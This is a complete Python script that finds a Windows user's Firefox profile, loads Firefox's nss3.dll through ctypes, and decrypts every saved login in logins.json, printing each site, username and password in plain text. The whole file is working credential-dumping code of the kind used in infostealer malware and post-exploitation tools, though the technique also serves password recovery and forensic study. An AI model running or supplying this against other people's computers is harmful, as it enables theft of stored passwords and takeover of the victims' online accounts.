import os
import sys
import json
import base64
import ctypes
from ctypes import c_void_p, c_char_p, c_int, byref
from configparser import ConfigParser

class SECItem(ctypes.Structure):
    _fields_ = [("type", c_int), ("data", c_void_p), ("len", c_int)]

def find_default_profile():
    appdata = os.environ.get("APPDATA")
    ini_path = os.path.join(appdata, "Mozilla", "Firefox", "profiles.ini")
    if not os.path.exists(ini_path):
        print("[!] profiles.ini not found")
        return None

    config = ConfigParser()
    config.read(ini_path)

    for section in config.sections():
        if config.has_option(section, "Path"):
            path = config.get(section, "Path")
            is_relative = config.getboolean(section, "IsRelative", fallback=True)
            if is_relative:
                full_path = os.path.join(appdata, "Mozilla", "Firefox", path)
            else:
                full_path = path
            if os.path.exists(os.path.join(full_path, "logins.json")):
                return full_path
    print("[!] No profile with logins.json found")
    return None

def load_nss():
    nss_path = r"C:\Program Files\Mozilla Firefox"
    dll_path = os.path.join(nss_path, "nss3.dll")

    if not os.path.exists(dll_path):
        print(f"[!] nss3.dll not found at: {dll_path}")
        return None

    os.environ['PATH'] += os.pathsep + nss_path
    try:
        return ctypes.CDLL(dll_path)
    except OSError as e:
        print(f"[!] Failed to load nss3.dll: {e}")
        return None

def initialize_nss(nss, profile_path):
    if nss.NSS_Init(profile_path.encode()) != 0:
        print("[!] NSS_Init failed")
        return False
    return True

def decrypt_string(nss, encrypted_b64):
    try:
        encrypted = base64.b64decode(encrypted_b64)
        item_in = SECItem(0, ctypes.cast(ctypes.create_string_buffer(encrypted), c_void_p), len(encrypted))
        item_out = SECItem()

        if nss.PK11SDR_Decrypt(byref(item_in), byref(item_out), None) != 0:
            return "[decryption failed]"

        return ctypes.string_at(item_out.data, item_out.len).decode('utf-8', errors='ignore')
    except Exception as e:
        return f"[error: {e}]"

def decrypt_firefox_passwords():
    profile_path = find_default_profile()
    if not profile_path:
        return []

    nss = load_nss()
    if not nss or not initialize_nss(nss, profile_path):
        return []

    logins_path = os.path.join(profile_path, "logins.json")
    if not os.path.exists(logins_path):
        print("[!] logins.json not found in profile")
        return []

    with open(logins_path, "r", encoding="utf-8") as f:
        logins = json.load(f)

    results = []
    for login in logins.get("logins", []):
        site = login.get("hostname", "")
        user = decrypt_string(nss, login.get("encryptedUsername", ""))
        pw = decrypt_string(nss, login.get("encryptedPassword", ""))
        results.append(f"Site: {site}\nUsername: {user}\nPassword: {pw}\n")

    nss.NSS_Shutdown()
    return results

if __name__ == "__main__":
    passwords = decrypt_firefox_passwords()
    if passwords:
        print("\n".join(passwords))
    else:
        print("[!] No credentials decrypted.")